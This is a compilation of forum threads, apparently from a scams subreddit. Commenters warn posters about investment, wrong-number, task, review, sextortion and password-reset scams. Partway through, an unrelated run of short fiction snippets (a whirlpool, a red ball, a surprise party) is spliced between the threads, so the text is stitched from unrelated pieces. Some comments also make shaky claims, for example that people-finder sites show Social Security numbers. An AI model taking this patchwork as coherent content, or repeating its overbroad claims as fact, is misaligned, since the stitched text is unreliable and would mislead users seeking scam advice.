I'd find out who is hosting the site and report it to them. Then find out the country of the originating caller and try to report to their fraud department(s).

There's ways to do it. Just takes some homework.
- Here is a TikTok video going into detail about the scam https://www.tiktok.com/t/ZP8FWdhb1/ 

Lost a lot of money and ended up having to get a second job, I wouldn‚Äôt want anyone else falling for this bull shit.
- I hate to say it but your mom needs to immediately report the fraud to the bank so they can lock it down.
Cancel all card(s) your dad has.
Have the bank get involved to tell him flat out it is fake.

If he STILL refuses to listen, tell your mom she has to control all finances before he ends up plunging them into bankruptcy.
- Ah. That'll be hard. Although I have problematic parents, they're 80 and very cautious about their money. So when it comes to anything digital or modern they prefer old school shopping, banking and investing. We have a family Viber thread and when they get anything through text including scams, they get our opinion. So far they haven't fallen prey to anything. Good luck to you!
- They tell him everything he wants to hear and you tell him everything he doesn't. So it's kinda easy to see why he is rejecting you for now. But it might change, there is always a chance that the seed of doubt is growing in him slowly.

They say he can retire your mom. You can just keep saying his investments make it harder for your mom to ever retire. You can say he is acting with god intentions and is a good man, but that they will gut him like a pig and laugh all the way to the bank.  
I might even use these exact words (the pig gutting) just because I'd try all the methods I can. Soft loving speach, crying and pleading, offering loads of money, using authorities, explaining like to a child, showing videos and info, using crude language... etc. I don't know your dad so I don't know what would be the best method to get any message through. But it might not be the way you think, so I would try many different approaches. 

Get your mom to talk to him?

- This website was created last July.

It's obviously fake. It's 100% a scam. 

Your father's ego needs to be comforted. People believe what they want to be true, what makes life easiest.

It sounds like he will just keep dumping money into this until the day he needs some back. And then they'll ask him to pay the taxes on his gains before they'll release it. And he will. And they'll drag it out for months, draining him a few more times before he gives up.

There are many stories like this here on this sub. A ton, really. Do you want to take over his finances for him via the court? Because that's the only way to really stop this, unless you can get him to realize otherwise in a way that protects his fragile ego.

- Hi /u/Ok-Lingonberry-8261, AutoModerator has been summoned to explain the Wrong number scam.

An intentional wrong number text is the entry point to multiple different types of scams. Because these are so prevalent and lead to several unwelcome outcomes (including you confirming you have a live number, leading to more spam/scams), it is recommended that you do not reply to them, even out of courtesy. They hope to take your courtesy, parlay it into a conversation (often by commenting how nice you are and giving some suggestion of fate in meeting this way), and eventually deploy a scam.

If you received a wrong number inquiry that seems to assume a connection with you (e.g. seeking a specific friend, inquiring about a doctor‚Äôs appointment, asking about a business correspondence, etc.) and there are no pictures included, then you are likely at the beginning of a crypto scam. Use ! crypto without the space to get more info on crypto scams. You can see a video of this scam develop from wrong number to crypto scam at https://www.youtube.com/watch?v=CZ_flb9tGuc

If you receive a random text from a woman that is trying to play up a relationship/hook-up angle and includes an alluring photo, you have encountered what this subreddit often calls the Mandy scam, based on the name used in an early incarnation of it. The replies are sent by a bot and will give the same responses (with some slight variations) regardless of how you respond. The bot also has a few specialized responses that occur when you say words like 'bot' or 'scam'. After a series of replies, it will eventually push you to go to an adult/cam/age verification site. Here are some of the posts on r/scams about the Mandy scam: https://www.reddit.com/r/Scams/search?q=mandy&restrict_sr=on&include_over_18=on&sort=relevance&t=all, you can see that the images, names, and scenarios vary. You can report spam texts by forwarding them to 7726 (SPAM): https://www.consumer.ftc.gov/articles/how-recognize-and-report-spam-text-messages

There is also some evidence that intentional wrong number texts can be part of a data-gathering exercise where each bit of info you give (e.g 'Hi Susan!' and you reply with your name out of courtesy) is collected to be used against you in other scams. Thanks to redditor teratical for this script.

- I work at a bank. It absolutely can, and does, disappear all the time.
- Yup. 

The bonus is they know that‚Äôs the first thing friends and family will say to victim. It‚Äôs already so difficult to break through to victims, if you get proven wrong on an ultimatum like that it may be impossible to ever convince them. That‚Äôs why I always warn to be incredibly careful when you tell someone ‚Äúask them to do X. If they don‚Äôt it‚Äôs a scam.‚Äù If you aren‚Äôt 200% sure that the scammer can‚Äôt do that thing, don‚Äôt even bother saying it. Often there are a litany of things you can point to in order to prove it‚Äôs a scam, don‚Äôt hang your hat on a single point that could come back to bite you.

Title: Scammer forgot to spoof their number
Body: I just had someone call me from a number I didn‚Äôt recognize in Ontario. He said he was calling from my bank (RBC) but then quickly hung up on me. I then received another call from a number that is associated with my bank. I answered and it was the same person. I told him I didn‚Äôt believe him and he hung up on me. Maybe this is naive of me but wondering if there is anyone it would make sense to share this guy‚Äôs actual phone number with that would be helpful?

- Forget about it. Don't answer anymore calls from numbers you don't know. Go enjoy your life
- Names, addresses, and phone numbers are typically public records. Organized scammers collect that information into massive databases to share/sell.
- Very common scam precursor, it‚Äôs easy to pull names and addresses off the internet, phone numbers, the whole lot. Sometimes the scammer will make threats, sometimes they will just mark the number as ‚Äúlive‚Äù so it can be sold to a future potential scammer.
- They may have looked up your number on a site like been verified, numlookup, or  people finders. You are able to see addresses, phone numbers, names, emails, social accounts and other stuff using those services. Those sites use public info so things like your ssn or I'd number will be displayed
- Any chance your information is readily available on your social media profile? I don't put my home address, phone number, date of birth or anything personal on my social media. If it's required, I put fake date of birth (for example).
- Your name and phone number are probably on the 'Net somewhere. 

Just block the number and stop worrying. Can your mobile screen calls? Let it screen or block unknown numbers. Let them go to voice mail if it's important. Most won't.

Title: Is this a Microsoft scam email please?
Body: I don't use Reddit a great deal so I hope I've found the right place.

I keep on receiving this email from Microsoft asking me to reset my password.

I think it's for my 365 account that I've not used for a few years now and I don't have access to now I don't have a computer.

Going by what you see here, does this look genuine to you please?

I can't do a screenshot the rules say, so I'll type it out:

From: Microsoft account team ‚Ä¢ account-security-noreply@accountprotection.microsoft.com

Message says:
Microsoft account
Password reset code
Please use this code to reset the password for the Microsoft account (my email address)
Here is your code: (6 digit code)
If you don't recognize the Microsoft account  (my email address again,) you can click here to remove your email address from that account.
Thanks,
The Microsoft account team

- No it is not.

Go to your Microsoft account, enable 2FA and change the password.
- That is the standard email Microsoft sends out when trying to reset a password. Either someone is trying to get into your account, or someone fatfingered their username when trying to log in, failed, and is now trying to reset the password.

It does NOT mean someone is in your account, or knows your login information. As long as you didn't share that code your account is secure. However, I would recommend changing your password and enabling 2FA if you haven't already.
- Huh? That's the standard "forgot password" email from Microsoft and the email address is the post is from microsoft.com. It's legit.
- Thank you. Thing is as I don't have a computer anymore, I don't know how to access that account anymore. So not sure how to proceed.
- Question -> is it a scam

Answer -> no it is not

:)

I think they're actually already in OPs account yea, since they want to reset the pass
- If you have a phone with a browser, you can visit [login.live.com](http://login.live.com) or [office365.com](http://office365.com) or [xbox.com](http://xbox.com) and sign in then navigate to the account page. 

The email implies that someone is trying to log into your account and reset the password.   It may be accidental (like they have used a similar email and mistyped it), or malicious.  As stated above, reset your password to a very strong one, and enable 2-factor auth.  You can install an Authenticator app to provide 2FA codes.   

A Microsoft Account is used to identify you for a number of services that you may still want to use even without a computer (like outlook email).  You should keep it secure.  Also consider adding a trusted alternate email.
- Use your phone. 

Btw, don't click links on that email in case that email is spoofed. Just go directly to Microsoft's website and change your passowrd.
- For some reason I read this is "Is this email legit" :/
- Thats how most posts start here loo, this was one to see if we're awake and paying attention ;)

Title: Random WhatsApp Message Leads to Coffee Invitation‚ÄîIs This a Scam?
Body: Hi everyone,

I just had a strange interaction on WhatsApp, and I‚Äôm trying to figure out if it‚Äôs a scam or just an innocent mistake. Here‚Äôs what happened:

Someone named ‚ÄúElena‚Äù messaged me, thinking I was someone named James. I told her she had the wrong number, and she apologized, saying it was an embarrassing mistake. The conversation started casual but friendly.

She mentioned she‚Äôs in London (like me) but traveling to Manchester tomorrow. Then, the tone changed‚Äîshe started saying I‚Äôm nice, that I made her smile, and even offered to meet for coffee as a way to ‚Äúmake up for her mistake.‚Äù She insisted it‚Äôd be her treat.

I politely declined, but it felt weird. I‚Äôve heard of scams starting with friendly messages like this, but I‚Äôm not sure where this could lead if it‚Äôs a scam.

Has anyone else experienced something like this? Could this be a setup for a scam, or am I overthinking it? Any insights would be appreciated!

Comments:
- What tends to be the enormous red flag is the idea that a woman would give information about herself and then offer to meet a stranger simply after a wrong number. Generally, people with an operational sense of self-preservation aren't that open with random strangers. The usual play here is the idea that men will respond to out-of-the-blue overtures from women, hoping for a relationship/sex and then allow themselves to be strung along (normally straight into sketchy investment schemes).
- >Someone named ‚ÄúElena‚Äù messaged me, thinking I was someone named James.

!wrongnumber - can lead to different scams
- lol poor guy .. textbook scam in the making. She‚Äôll have to cancel but build enough trust with you that you start falling for her stories and send her money or gift cards or invest in her amazing crypto business
- Why do people respond to randos on WhatsApp? 

If you don't know them, it's a scam - full stop.
- Tell her you ran into James at the coffee shop and he told you Elena's a dirty liar.

Definitely a scam set up, as you know
- RED FLAGS!!!

If you are suspicious enough to post it on reddit scams sub, then you already know the answer. 

This is a scam.
- If it‚Äôs on WhatsApp‚Ä¶ it‚Äôs a scam.
- It's a China or Southeast Asia-based scam that normally targets people they presume to be wealthy but single middle-aged or older men. The scammer claims the the persona of a young but successful female‚Äîthe scam often opens with something like "Hi Lilly, this is Janet can we meet tomorrow about decorating the law firm's  new offices?". Or that the scammer met you at a charity ball or such. They always open with something suggesting they have a successful and glamorous lifestyle. Once you respond and say they have the wrong number they are very apologetic and often want to "become friends" or meet for coffee or such. The purpose of the scam is to eventually gain your trust and get you to invest a lot of money in an investment scheme they run and then when they have all your money they think they can get, they'll ditch you and just take the (very much not invested money) for themselves. 

I got the "Hi Lilly, this is Janet can we meet tomorrow about decorating the law firm's new offices?" just the other day. I'd heard about these scams and had one attempt before, but that example just the other day. I responded it was the wrong number, I'm not an interior designer but a gymnastics coach. The scammer apologies profusely saying she will "scold her assistant for giving her the wrong number" and how I am "such a nice gentleman to not be cross" with her so could be maybe be friends?

I responded with "why do you think I'm male: you texted the wrong number but thought it was your female colleague, right? And probably more gymnastics coaches are female than male, so why think I'm a dude?". Silence from the scammer. Yes, in fact I *am* male. She likely *knows* this and plotted to target me in part on this, but given what she's pretended and what I told her, no reason to presume I'm male. 

The wobbly, formal, and dated English are also clues here: "scolded", "cross", why is a dashing young lawyer speaking like someone out of a novel from 1920?
- WhatsApp is full of scams
- Thousands of these fake messages are sent every day. 

It‚Äôs a guy messaging you from overseas who is going to start suggesting you invest in Crypto‚Ä¶
- ‚ÄúElena‚Äù is likely a him, not a her. Elena wouldn‚Äôt have shown up, but he would have kept texting. Elena would end up somewhere else, like Paris taking care of his sick mom, but he would make a plan to visit you.  Something would have happened, like Elena lost his wallet at the airport, and you would be asked to send him some money.  Classic scam.  Or Elena would want you to invest in his crypto currency. Or he would want a dick pic and then would threaten to send it to your mom if you didn‚Äôt pay.  Lots of ways it could have gone.

If a strange woman wants to talk on what‚Äôs app, assume it is a man.  Because 100 times out of 100 it is a man trying to scam you.
- Just a coincidence, the coffee date is part of the escape plan. If you haven't deleted the discussion, it will disappear before tomorrow.

Title: not sure if this legit or a well planned scam "Dentsu"
Body: long story short. there is this company called "Dentsu" offers a bunch of ranks to get tasks (videos to watch) from them so they pay you for each task.   
P0 which is free up to P8

each rank requires around Trible the amount from the previous but the pay is better.

To be honest I only paid for P1 cost around 42 USDT (tether US the currency they work with) and gaining from the task they gave me but didn't withdraw anything yet and they have their own WhatsApp group. some ppl in the group claim that they actually received their pay through their digital wallet with screenshots but something seems off with this (easy to earn) money that bugs me.  

so far inspecting the group photos I cant see anyone that have their balance (in the company app) have more than 100 USDT which is strange. any experienced People here have a say in this please I am all ears.

- This is pretty much a textbook !task scam: well paid menial tasks a click farm in China can do for cents, crypto payments, "ranks" to pay more money to "earn" more money Telegram/Whatsapp/Line/etc. group.

Sometimes they let victims just caught withdraw some money to pull them even deeper: try do that. If you manage to do that run away as fast as you can. If your money is lost, run away as fast as you can: you got away cheap, many many people lost thousands to this scam.
- It's 100% a scam, they will never pay. The money you sent is gone and not retrievable by anyone.
- Just FYI, this isn‚Äôt Dentsu. Dentsu is a legit company. You are dealing with an imposter. Take a look at the domain any email comes from, what numbers they‚Äôre using. They are not Dentsu‚Äôs.

- Hi /u/RudbeckiaIS, AutoModerator has been summoned to explain the Task scam.

Task scams involve a website or mobile app that claims you can earn money by completing easy tasks, such as watching a video, liking a post, or creating an order. A very common characteristic (but not entirely exclusive) is that you have to complete sets of 40 tasks. The app will tell you that you can earn money for each task, but the catch is that you can only do a limited number of tasks without upgrading your account. To upgrade your accounts, the scammers will require you to pay a fee. This makes it a variant of the advance fee scam.

The goal of this scam is to get people to download the app for easy money and then encourage them to pay to get to the next level. It's impossible to get your \"earnings\" out of the app, so victims will have wasted their time and money. This type of scam preys on the [sunk cost fallacy](https://en.wikipedia.org/wiki/Sunk_cost#Fallacy_effect), because people demonstrate a greater tendency to continue an endeavor once an investment has been made, and refusing to succumb to what may be described as cutting one's losses.

If you're involved in a task scam, cut your losses. Beware of recovery scammers suggesting you should hire a hacker that can help you retrieve the money you already invested. They can't, it's a trick to make you lose more money. Thanks to redditor vignoniana for this script.

- That was the plan. even if it was a scam. the least they will get away with. they gathered around 700+ ppl. they will give you extra for every person you pull down with you. But I was wondering what they will do? prevent you from withdrawing or closing the whole site down? educate me please.
- I was shooting my shot with minimum loses. but I was wondering what card will they play? how and when the scam will happen.
- They got their own app. very to no effort on building. messed up layout which what got me suspected.  
but how they let people with draw their own money. how are they planning to scam them if they let the people get the amount they paid. or at least partially.

- Short and clear. thank you sir
- Yes, they will prevent you from withdrawing. Because the whole thing is fake. The tasks are fake, to make you think you are really doing something that will make you money (profit, pay). The website is phony. The numbers on the website are controlled by scammers, they can put whatever numbers they want on those screens.

Nobody really pays you for clicking a screen, no matter what they call it.

**And you are scamming your friends. Don't tell your friends to join this scam group, they will lose money.**
- It already did. You paid money into it.
- The card they will play is that you will never be able to withdraw, only deposit. That's it. The scam has already occurred and it's up to you how long you want to continue to be scammed for.
- It‚Äôs bait. Let them have a little bit of the money they stole from other people. It works. Seems to be working on you lol. 

Yeah if the app looks like shit or a template, not trustworthy.
- No one got money. You are not communicating with anyone else who is not part of the scamming operation. It is all crafted to suck you in and get you to deposit money thinking you are going to get more back. Like someone else commented, sometimes they will give you a small withdrawal to get you more trusting before asking for a bigger deposit. Maybe you can pull a little back that way. Either way stop playing into the scam
- Thank you and everyone else contributed to this community. no worries I wont do anything or invite anyone.
- all I need to hear thank you very much.
- It almost did. though I am not usually falling for online scams but this one made it through it seems. anyway thank you for your information I am very grateful.
- not feeding them anymore from what I already paid (in the post). I will play with what ever balance I have in the app. wont deposit anymore credit. until they kick me off I suppose.

Finding the truth wouldn't be easy, that's for sure. Then there was the question of whether or not Jane really wanted to know the truth. That's the thing that bothered her most. It wasn't the difficulty of actually finding out what happened that was the obstacle, but having to live with that information once it was found. Sarah watched the whirlpool mesmerized. She couldn't take her eyes off the water swirling around and around. She stuck in small twigs and leaves to watch the whirlpool catch them and then suck them down. It bothered her more than a little bit that this could also be used as a metaphor for her life. She asked the question even though she didn't really want to hear the answer. It was a no-win situation since she already knew. If he told the truth, she'd get confirmation of her worst fears. If he lied, she'd know that he wasn't who she thought he was which would be almost as bad. Yet she asked the question anyway and waited for his answer. He hid under the covers hoping that nobody would notice him there. It really didn't make much sense since it would be obvious to anyone who walked into the room there was someone hiding there, but he still held out hope. He heard footsteps coming down the hall and stop in front in front of the bedroom door. He heard the squeak of the door hinges and someone opened the bedroom door. He held his breath waiting for whoever was about to discover him, but they never did. The time to take action was now. All three men knew in their hearts this was the case, yet none of them moved a muscle to try. They were all watching and waiting for one of the others to make the first move so they could follow a step or two behind and help. The situation demanded a leader and all three men were followers. She had been an angel for coming up on 10 years and in all that time nobody had told her this was possible. The fact that it could ever happen never even entered her mind. Yet there she stood, with the undeniable evidence sitting on the ground before her. Angels could lose their wings. She had been told time and time again that the most important steps were the first and the last. It was something that she carried within her in everything she did, but then he showed up and disrupted everything. He told her that she had it wrong. The first step wasn't the most important. The last step wasn't the most important. It was the next step that was the most important. The rain was coming. Everyone thought this would be a good thing. It hadn't rained in months and the earth was dry as a bone. It wasn't a surprise that everyone thought a good rain was what was needed, but they never expected how much rain would actually arrive. The wave roared towards them with speed and violence they had not anticipated. They both turned to run but by that time it was too late. The wave crashed into their legs sweeping both of them off of their feet. They now found themselves in a washing machine of saltwater, getting tumbled and not know what was up or down. Both were scared, not knowing how this was going to end, but it was by far the best time of the trip thus far. The red ball sat proudly at the top of the toybox. It had been the last to be played with and anticipated it would be the next as well. The other toys grumbled beneath. At one time each had held the spot of the red ball, but over time they had sunk deeper and deeper into the toy box. Indescribable oppression, which seemed to generate in some unfamiliar part of her consciousness, filled her whole being with a vague anguish. It was like a shadow, like a mist passing across her soul's summer day. It was strange and unfamiliar; it was a mood. She did not sit there inwardly upbraiding her husband, lamenting at Fate, which had directed her footsteps to the path which they had taken. She was just having a good cry all to herself. The mosquitoes made merry over her, biting her firm, round arms and nipping at her bare insteps. As she sat watching the world go by, something caught her eye. It wasn't so much its color or shape, but the way it was moving. She squinted to see if she could better understand what it was and where it was going, but it didn't help. As she continued to stare into the distance, she didn't understand why this uneasiness was building inside her body. She felt like she should get up and run. If only she could make out what it was. At that moment, she comprehended what it was and where it was heading, and she knew her life would never be the same. It was a simple green chair. There was nothing extraordinary about it or so it seemed. It was the type of chair one would pass without even noticing it was there, let alone what the actual color of it was. It was due to this common and unassuming appearance that few people actually stopped to sit in it and discover its magical powers. It really didn't matter what they did to him. He's already made up his mind. Whatever came his way, he was prepared for the consequences. He knew in his heart that the sacrifice he made was done with love and not hate no matter how others decided to spin it. She nervously peered over the edge. She understood in her mind that the view was supposed to be beautiful, but all she felt was fear. There had always been something about heights that disturbed her, and now she could feel the full force of this unease. She reluctantly crept a little closer with the encouragement of her friends as the fear continued to build. She couldn't help but feel that something horrible was about to happen. He couldn't remember exactly where he had read it, but he was sure that he had. The fact that she didn't believe him was quite frustrating as he began to search the Internet to find the article. It wasn't as if it was something that seemed impossible. Yet she insisted on always seeing the source whenever he stated a fact. The light was out on the front porch of the house. This was strange. Judy couldn't remember a time when she had ever seen it out. She hopped out of her car and walked to the door. It was slightly ajar and she knew this meant something terrible. She gently pushed the door open and hall her fears were realized. "Surprise! Happy Birthday!" everyone shouted. They argue. While the argument seems to be different the truth is it's always the same. Yes, the topic may be different or the circumstances, but when all said and done, it all came back to the same thing. They both knew it, but neither has the courage or strength to address the underlying issue. So they continue to argue. It was a simple tip of the hat. Grace didn't think that anyone else besides her had even noticed it. It wasn't anything that the average person would notice, let alone remember at the end of the day. That's why it seemed so unbelievable that this little gesture would ultimately change the course of the world. "What is the best way to get what you want?" she asked. He looked down at the ground knowing that she wouldn't like his answer. He hesitated, knowing that the truth would only hurt. How was he going to tell her that the best way for him to get what he wanted was to leave her? There are different types of secrets. She had held onto plenty of them during her life, but this one was different. She found herself holding onto the worst type. It was the type of secret that could gnaw away at your insides if you didn't tell someone about it, but it could end up getting you killed if you did. Brock would have never dared to do it on his own he thought to himself. That is why Kenneth and he had become such good friends. Kenneth forced Brock out of his comfort zone and made him try new things he'd never imagine doing otherwise. Up to this point, this had been a good thing. It had expanded Brock's experiences and given him a new appreciation for life. Now that both of them were in the back of a police car, all Brock could think was that he would have never dared do it except for the influence of Kenneth.

Title: What‚Äôs the deal with AI-generated reviews on Google?
Body: TL;DR: I‚Äôm convinced most reviews are fake. How is it done and how do I spot them/weed them out?

So many subpar restaurants seem to have 4.8+ out of 5 ratings now. Taking a quick read through the reviews, all the positive reviews sound like they‚Äôre all written by the same person ‚Äî perfect grammar and spelling, well structured, effusive with no real specifics (e.g. the reviews might mention a specific dish but not what they specifically like about the dish). Then oftentimes there‚Äôs a reply by the owner that‚Äôs equally perfect and well-structured. 

I‚Äôll admit I bought into it at first but when I took a minute to think about it I realized how ridiculous the reviews are. For instance, I‚Äôm in Thailand, the replies by the restaurant manager/owner are always in perfect English. Native English speakers don‚Äôt write this well! 

Then I started reading the negative reviews and the non-glowing reviews. THOSE reviews are the ones with a unique voices, writing flaws, something specific to criticize, etc. 

So now I‚Äôm convinced that 80% or more of reviews are fake, but how? Can someone more scam savvy tell me how all these fake reviews are generated and how to watch out for them?

- There are a lot of companies out there whose buisness models are writing online reviews. You can literally buy 5 star reviews on Google, Amazon and other places and even buy negative reviews on your competitors. Check out You Tube. There are some excellent and eye opening videos on the subject including how Amazon and other companies are working on the issue as it undermines their businesses.
- I like the part where you visit a business that has been open less than a month and doesn't seem busy yet has 175 raving reviews on Google.

Another one recently was a new business that had 6 reviews and all of the reviewers shared the same last name.
- ‚Äú‚Ä¶and even buy negative reviews on your competitors.‚Äù

Dude, that‚Äôs fucked up. 

Thanks for the reply! I‚Äôll check out some YouTube vids. Any red flags to spot fakes?

Title: Need insight- Pictures of my house
Body: Today I received a text that just had a picture of my house. It was taken by someone in a car out front. Definitely not a screen shot of Google Maps. The number the picture was sent from is a bot when you call it back. Looks like someone took the extra step to disguise their identity. 

I‚Äôve seen some scams where they send you pictures of the house. But in this case, they were at my house. 

None of my friends would do this. I‚Äôve been at my house 10 years. I didn‚Äôt recognize the car. I made a police report and left the residence. 

Is there any possibility this is a scam?

- Sounds like one of your 'friends' isn't your friend.  Ever make any enemies?  Have any ex's?  Did you start a new relationship recently?  

This photo was intentionally sent to your number, it's not a traditional text scam which is impersonal and a numbers game.

If it's a scam, something will happen where money, investment, fines, taxes, or fees will happen also via text.  If this was pig butchering it would have came with a big story.  

This seems personal.  Get a Ring doorbell or outdoor cameas, they're not as expensive as you might think.
- That's genuinely chilling.  Definitely not the sort of scam we're used to seeing, if it even is one.  Someone is definitely trying to mess with you in a particularly cruel way.

It's possible whoever was in the car isn't really directly involved.  Someone could have requested someone drive by and take pictures under the pretense that they're being helpful somehow.

Definitely do all the usual home-security precautions like getting cameras installed, make sure at least one light is on even at night, have a car in the driveway, and so on.

This one is so mean it almost has to be someone you know and who REALLY has a problem with you.  At a bare minimum it's someone who has both your address and cel number.  Think very hard if anyone with that info would have any reason to scare you: any relationships that ended badly, clients who felt cheated, crazy neighbors, anyone like that?
- Yes I agree it feels very personal. I‚Äôve been married for 12 years and in the same house for 10 years. We know all of our neighbors. I‚Äôm a mom of two young kids so my social life isn‚Äôt vibrant. 

I do have a business in my city so I interact with people in that regard. I‚Äôm purchasing Ring cameras tonight. 

Thank you for the response! I want to rule out scan options before I go full FBI.
- Update: I spoke with my landlord. (I guess the fact that I‚Äôve rented here for 10 years is important) She had a discrimination lawsuit filed against her by a woman who toured the upper level of the duplex. I wrote a statement of character for my landlord yesterday at 3:30pm. She submitted it to an investigator for the case shortly after. 

The lady filing the suit should have not ever have seen that statement with my information. The only way it could happen is if the statement is already in public record on the court filings. 

The car drove by at 1pm today. 22 hours after I submitted the statement. 

It‚Äôs a possibility. I‚Äôm calling the investigator in the morning to see if anything has been filed.
- Leave lights on outside.  Make it really hard for someone with a passing revenge fantasy to do anything without getting caught.  It could be a disgruntled customer.  

I was one once.  I've looked up the mailing address for the owner of a business before (my property management company), it cost me $12, and I sent certified mail to her home.  (I'm in Canada). So, afaik this could be publicly accessible information.  If you're American, apparently cellphone numbers are listed with names (not the case here so I can't confirm).  

Tapo wifi cameras are also pretty cheap on Amazon and you can mount them in any window to watch the area outside your home, 24/7, and send movement notifications, just like a ring doorbell.  I'm not saying you should be legit afraid of some altercation, just an option.  Most people are chickenshit and like to front, and sending a pic of a house is a pretty chickenshit way of causing harm to someone.
- Thank you so much!! This is helpful and comforting.

Scam. Any more red flags you ignored?
- SCAM, 99% chance its cheap dropshipped garbage you could get for 1/10th the price on aliepxress
- If they are this unresponsive when you reach out to them with a simple question about their fabric, imagine how difficult it would be to get ahold of them if something went wrong after you gave them your money and financial info?
- Looked at their IG page. Best case scenario it's clothing from aliexpress or shein sold x2 the price.

Title: Underage scam, peace of mind
Body: Hi so I‚Äôve read like dozens of these on here now and I think I just want some peace of mind. Met with a girl on POF, said she was 18 sent me unsolicited nudes after about a day of talking surprise she‚Äôs 17. I told her it was inappropriate and ended the conversation. Then I get a phone call from a police station (the number matched but I do understand spoofing) it was a station near where the girl said she was from. Detective whatever his name was says I‚Äôm breaking the law, the daughter was arrested for assaulting a teacher when someone saw her messages on her phone, dad has the phone and is feeling remorseful call him. I asked if the state could press charges and he said ‚Äúwell we don‚Äôt have the phone so there‚Äôs no evidence‚Äù. The officer also mentioned that because I‚Äôm military I could be tried that way. Seemed fishy, he had my name but said it incorrectly. I call dad he‚Äôs telling me mom wants to throw me in jail he doesn‚Äôt want to do that but he doesn‚Äôt know what to do, he‚Äôs going to have to sell his truck to bail the daughter out for assaulting the teacher etc. I haven‚Äôt paid the dad anything despite him asking me to and asking that I take out a loan. I‚Äôve read a lot about these targeting service members in particular and I have spoken to a lawyer, I guess my question is do I put him on retainer or not? What‚Äôs got me caught up is the realism of these people, it was uncanny how real they sounded. I realize a cop more than likely wouldn‚Äôt call me like that, I‚Äôm just paranoid. I‚Äôve seen scams before but this is next level if this is what it is. Any help is appreciated. Thanks

Update: Update. Got a second call from the dad. This time from a No Caller ID number. Looked up the original phone he used number says it‚Äôs computer generated. He texted me since I posted (prior to blocking him) this telling me I could get a loan and asking if I had any credit cards

- It's kinda hard to read what your actual question is with this wall of text, but it sounds like a standard !underage scam.

You do nothing. You block the numbers and move on with your life. There's nothing else to do.

edit: You do not need to talk to a lawyer. None of this is real.
- This is indeed the same underage scam you've read about and people have posted a million times. The scenario plays out the same way. I know the voice in your head is telling you this is somehow different because some little detail somewhere is different, but it's not. The scenario is:

* You meet a girl online
* Girl claims to be of age (yay!)
* Girl eagerly and willingly sends nudes right away (double yay!)
* Oops! Girl is actually NOT of age (oh no!)
* Parents and the police suddenly get involved
* Instead of prosecuting you, the parents are weirdly focused on extorting you for random expenses (I've seen paying for a broken laptop, therapy, broken screen door, now bail. But again, the small detail of what it's for doesn't matter)
* They will continue to come up with a never ending list of expenses to keep getting you to pay

Block everyone involved. Sometimes a single scammer may play the role of everyone involved while using a video of a girl they stole online to lure you in, other times it may be a team of scammers. Either way, this is all fake.
- ". Detective whatever his name was says I‚Äôm breaking the law"

This is where you shut up/hang up/walk away (if not detained) anytime law enforcement says you are in trouble or asking about something you may have been involved with.

If you are in trouble, they will be at your door.
- OP, you don't need a lawyer. But don't talk to any of these people again, they are all scammers. You did nothing wrong or illegal. They want to scare you to give them money. Don't pay anything.

The girl, the fake police, the phony father and mother -- all of them are working together to blackmail you. And the scammers aren't in your state, or country, or near your base -- these scams are run by groups in southeast Asia, or Africa.

Also, officers at the local police department aren't spending time calling people about sending nude pictures. **Police do not accept money to make charges go away.** Well, in some countries with bad police corruption they probably do.

So, hopefully, you've learned a lesson: if a girl sends you nudes, or wants you to send her nudes, she is setting you up for a scam.
- Common scam reported here all the time.  Don‚Äôt talk to these scammers.
- There's no girl, no detective, no teacher, no dad, and no mom.  There's just a scammer that wants your money.  Delete the messages.  Block the senders.
- Just block and ignore. It‚Äôs a very common scam.
- Lol if you're breaking the law they don't just phone you up.
- An arrest comes at your door, not through a phone call and no amount of money can make it go away. Period.
- 'She' was never talking to you. It was a grubby old perveman. 

Block and ignore.
- "hello person who is accused of having csam, this is the police, you should call the father of the victim and chat" 

I don't know how people fall for it but it's not how any of this works
- If the lawyer you talked to didn't tell you this is a scam don't ever go to that lawyer again.
- "...what you did was creepy..and illegal.. and I thought about pressing charges but maybe we can work something out.." said no parent ever. 

If this was my daughter, I'd probably start off with a bunch of WTF's demanding to know why she's sending this out.  And then the chat log would tell the story. There's a difference between a predator targeting the wrong age group and teenager advertising themselves as an adult. 

The minute that you ended the conversation when she revealed the truth about her age is what would have protected you. And then deleting the photos would have helped as well because there's always that moment between the time when you discover that you're doing something wrong and how long before you took action to correct it. 

Like if you pick up a hitch hiker and they leave drugs in your car. The possession is illegal but the important question is "what did you do when you discovered it?"
- Just to clarify: there was never a girl, underage or otherwise. Just scammers using stolen pic/videos to lure you.

Block and ignore.

And do practice better internet hygiene.
- Actually happened to me a decade ago . Yep. I ignored it, didn‚Äôt pay anything and blocked them.  Scary, though
- all of the people in the calls are the same guy hoping you will fall for it.

block and ignore
- Dont pay. Block. Ignore.
- It's not next level, it's the standard scam.  Yes, you are being paranoid.  Block and move on.
- There‚Äôs no girl, no cop, no dad. Just a scammer
- Common scam - you are in no danger. Block and ignore until they give up.

https://www(.)prisonlegalnews(.)org/news/2023/jun/15/fifth-south-carolina-prisoner-sentenced-sextortion-scams-targeting-military-members/

(Remove parentheses from URLs)
- It‚Äôs a small team of scammers based out of South Carolina it seems, they have been active for some time; it‚Äôs a pity no one has caught them yet but I can‚Äôt wait for it to happen!
- There is nothing next level about this. You already found all the similar stories to yours. Why are you still asking?
- They managed to somehow get me on this one. It‚Äôs a scam. To this day I still don‚Äôt know how this happened, but I think they flustered me so much I didn‚Äôt believe I had any other choice. They‚Äôre trying to scare you into giving them money. Don‚Äôt.
- The answer to this is very simple.  Repeat after me, you cannot buy your way out of criminal charges.  Repeat until it sinks in.
- Call the police station (look up the number on your own) and ask to talk to the officer who called you.
- This is 100% a scam. There is no girl. There is no police or parents. You are talking to a handful of scammers. The police just arrest people because they have warrants. They don‚Äôt negotiate child porn with payments. 

Block and move on
- if they have her phone, they can see the photos were sent unsolicited.
- The dude who sent you the picture is not underage.
- There's a reason this scam is literally posted every other hour - it works.
- Everyone says these scams are run out of nigeria, india, etc. Did the people who spoke to you have any kind of accents?
- Let‚Äôs just hypothetically think this was real, then the girl is in exactly the right place: In jail, rather than being jail bait. 

Again, nothing to do for OP except for blocking numbers and moving on.
- If a crime is being investigated the prosecutor decides on charges. Victims pressing charges being the cause of arrests or prosecution is dumb TV stuff.
- Always ask for proof of age if they don't provide then don't talk . Also is the photos were unsolicited they don't have much to go on delete any photos and block
- The cop called you to tell you to calm the dad to work it out? I‚Äôd imagine they‚Äôd have went after you anyway. Also if he had a truck to sell he could probably just get a bail bondsman to use it as collateral.

I mean none of this is true and that‚Äôs a common scam. But just trying to say why it doesn‚Äôt make sense just based on what‚Äôs going on.
- There‚Äôs no girl and no police. Just report, block, delete, ignore.
- Scam. Block them offf. They are just story telling a lie
